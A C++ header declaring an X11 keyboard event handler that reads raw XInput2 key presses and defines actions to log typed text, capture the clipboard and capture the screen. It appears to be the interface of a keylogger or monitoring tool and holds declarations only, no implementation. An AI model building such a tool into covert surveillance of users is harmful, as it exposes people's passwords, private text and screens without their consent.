#ifndef KEYBOARD_EVENT_HANDLER_HPP
#define KEYBOARD_EVENT_HANDLER_HPP

#include <X11/Xlib.h>
#include <X11/extensions/XInput2.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <string>

enum class KeyboardAction {
    NONE,               
    LOG_TEXT,           
    HANDLE_BACKSPACE,   
    CAPTURE_CLIPBOARD,  
    CAPTURE_SCREEN,     
    EXIT_APP            
};

struct ProcessedEvent {
    KeyboardAction action = KeyboardAction::NONE;
    std::string text_to_log;   
    std::string printable_name; 
};

class KeyboardEventHandler {
public:
    KeyboardEventHandler(Display* disp);
    ProcessedEvent handleEvent(XEvent& event);

private:
    ProcessedEvent processRawKeyPress(XIRawEvent* rawev);
    void processRawKeyRelease(XIRawEvent* rawev);

    Display* display;      
    bool ctrlPressed;      
};

#endif 